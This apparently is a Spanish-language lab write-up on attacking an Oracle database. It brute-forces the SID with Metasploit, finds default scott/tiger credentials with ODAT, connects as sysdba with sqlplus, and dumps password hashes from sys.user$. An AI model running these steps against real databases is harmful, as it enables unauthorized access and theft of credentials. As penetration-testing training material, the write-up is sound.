Utilizamos el scanner `auxiliary/scanner/oracle/sid_brute`:
<img width="1876" height="911" alt="image" src="https://github.com/user-attachments/assets/2ede9797-7516-49d8-8efd-f3600e3709cc" />

Con este scanner también obtenemos que el `SID` es `XE`.


Ahora enumeramos el servidor con `ODAT`:

```bash
odat all -s <ip>
```

<img width="1902" height="905" alt="image" src="https://github.com/user-attachments/assets/ecd340f0-e9db-4db5-805f-401da3b0522f" />

Encontramos credenciales válidas para `scott/tiger`.

El siguiente paso es interactuar con la base de datos, nos conectamos con `sqlplus`:
```bash
sqlplus scott/tiger@10.129.205.19/XE
```

<img width="1500" height="99" alt="image" src="https://github.com/user-attachments/assets/0c2b462b-fc1a-40c4-8003-1d20a904e6d2" />

Nos devuelve el error de la librería, por lo que buscamos la ubicación de la misma con:
```bash
find /usr -name libsqlplus.so 2>/dev/null
```
<img width="643" height="92" alt="image" src="https://github.com/user-attachments/assets/07b35fcc-7b69-4e45-b042-a86fc27e39e8" />

Ahora si podemos realizar el siguiente comando:
```bash
sh -c "echo /usr/lib/oracle/19.6/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";ldconfig
```
Luego conectarnos a la base de datos nuevamente con `sqlplus scott/tiger@<ip>/XE`:


<img width="665" height="300" alt="image" src="https://github.com/user-attachments/assets/b0de7e85-80cf-48a5-bc6c-b1510f8ebb39" />


Comenzamos la enumeración, listamos las tablas:

```sql
select table_name from all_tables
```
<img width="420" height="909" alt="image" src="https://github.com/user-attachments/assets/067af73d-9478-4898-a49b-dd69963512f6" />

Vemos los roles asignados al usuario actual:
```sql
select * from user_role_privs;
```
<img width="643" height="121" alt="image" src="https://github.com/user-attachments/assets/156e8e3b-05c2-4a9d-8364-f9d0d2bc7f7e" />

- SCOTT tiene roles típicos para trabajar (CONNECT/RESOURCE).
- No parece admin.

Intentamos conectarnos como `sysdba`:
```sql
sqlplus scott/tiger@<ip>/XE as sysdba
```

Vemos que pudimos conectarnos como sysdba y listamos todos los permisos que tenemos:
<img width="718" height="944" alt="image" src="https://github.com/user-attachments/assets/073779e3-31a3-4d45-be86-b39f2cadbdb1" />

Listamos información de los usuarios para obtener los hashes de las contraseñas:
```sql
select name, password from sys.user$;
```

<img width="605" height="949" alt="image" src="https://github.com/user-attachments/assets/97f186b2-8ede-425d-bcc7-e9b38ea8f546" />

Obtenemos el hash:
```
E066D214D5421CCC
```
